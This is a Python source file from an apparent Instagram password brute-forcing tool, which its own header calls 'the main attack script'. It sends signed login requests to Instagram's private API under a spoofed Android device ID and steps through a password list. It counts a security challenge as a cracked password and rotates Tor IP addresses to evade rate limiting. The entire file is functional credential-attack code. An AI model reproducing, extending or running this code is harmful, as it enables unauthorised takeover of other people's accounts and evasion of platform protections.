# The MIT License.
# Copyright (C) 2017 The Future Shell , DeathSec.
#
# @filename    : InstagramPyInstance.py
# @description : creates a new app instance and coordinates with
#                InstagramPySession , InstagramPyReports and InstagramPyCLI.
#                the main attack script.
import uuid
import hmac
import urllib
import json
import hashlib
import requests

class InstagramPyInstance:
    cli            = None
    guid           = str(uuid.uuid4())
    phone_id       = guid
    device_id      = None
    session        = None
    password_found = False

    def __init__(self , cli , session):
        if not cli == None:
            self.cli = cli
        else:
            self.cli = None

        if not session == None:
            self.session = session
        else:
            print('InstagramPyInstance:: no session given.')
            exit(-1)
        self.device_id = self.GetDeviceId()

    def GetDeviceId(self):
        user_hash = hashlib.md5()
        user_hash.update(self.session.username.encode('utf-8') + str(uuid.uuid4()).encode('utf-8'));
        device_hash = hashlib.md5()
        device_hash.update(user_hash.hexdigest().encode('utf-8') + '12345'.encode('utf-8'))
        return str('android-'+device_hash.hexdigest()[:16])

    def PasswordFound(self):
        return self.password_found

    def TryPassword(self):
        if not self.password_found and not self.session.eopl:
            request_data  = None
            response_data = None

            data = {
                'phone_id'   : self.phone_id,
                '_csrftoken' : self.session.magic_cookie,
                'username'   : self.session.username,
                'guid'       : self.guid,
                'device_id'  : self.device_id,
                'password'   : self.session.CurrentPassword(),
                'login_attempt_count' : '0'
            }

            json_data    = json.dumps(data)
            hmac_signed  = hmac.new(self.session.ig_sig_key.encode('utf-8') , json_data.encode('utf-8') , hashlib.sha256).hexdigest()
            json_data_enc= urllib.parse.quote(json_data)

            try:
                r = requests.Request(method='POST' , url='{}accounts/login/'.format(self.session.api_url) ,
                data='ig_sig_key_version={}&signed_body={}.{}'.format(self.session.ig_sig_version,
                                                                      hmac_signed,
                                                                      json_data_enc
                ) , cookies = self.session.bot.cookies , headers=self.session.bot.headers)
                request_data = r.prepare()
                r = self.session.bot.post('{}accounts/login/'.format(self.session.api_url) ,
                data='ig_sig_key_version={}&signed_body={}.{}'.format(self.session.ig_sig_version,
                                                                      hmac_signed,
                                                                      json_data_enc
                ))

            except KeyboardInterrupt:
                if not self.cli == None:
                    self.cli.ReportError('process aborted by the user')
                else:
                    exit(-1)
            except (BaseException , Exception) as err:
                if not self.cli == None:
                    self.cli.ReportError("unable to send request to instagram :: {}".format(err))
                else:
                    exit(-1)

            if r.status_code == 200:
                self.password_found = True
                if not self.cli == None:
                    self.cli.PrintProgress(password = self.session.CurrentPassword(),
                                               ip = self.session.ip,
                                               request = request_data,
                                               response = r.content
                        )
                    self.cli.ReportAttack(password = self.session.CurrentPassword() ,
                                          username = self.session.username ,
                                          password_list = self.session.password_list)
            else:
                response_data = (r.json())['message']
                if response_data == 'challenge_required':
                    self.password_found = True
                    if not self.cli == None:
                        self.cli.PrintProgress(password = self.session.CurrentPassword(),
                                               ip = self.session.ip,
                                               request = request_data,
                                               response = r.content
                        )

                        self.cli.ReportAttack(password = self.session.CurrentPassword() ,
                                              username = self.session.username ,
                                              password_list = self.session.password_list)

                elif response_data == 'The password you entered is incorrect. Please try again.':
                    if not self.session.current_save == None:
                        self.session.UpdateSaveFile()
                    self.session.NextPassword()
                    if not self.cli == None:
                        self.cli.PrintProgress(password = self.session.CurrentPassword(),
                                               ip = self.session.ip,
                                               request = request_data,
                                               response = r.content
                        )
                else:
                    if 'Invalid' not in response_data:
                        if not self.cli == None:
                            self.cli.PrintProgress(password = self.session.CurrentPassword(),
                                                   ip = self.session.ip,
                                                   request = request_data,
                                                   response = r.content
                            )
                            self.cli.PrintChangingIP()
                        self.session.ChangeIPAddress() # signal tor to change ip 
                    else:
                        self.session.NextPassword()

        else:
            if self.password_found:
                if not self.cli == None:
                    self.cli.PrintProgress(password = self.session.CurrentPassword(),
                                               ip = self.session.ip,
                                               request = request_data,
                                               response = r.content
                        )

                    self.cli.ReportAttack(password = self.session.CurrentPassword() ,
                                          username = self.session.username ,
                                          password_list = self.session.password_list)
            else:
                if not self.cli == None:
                    self.cli.ReportAttack(password = None,
                                          username = self.session.username,
                                          password_list = self.session.password_list)
                    exit(-1)
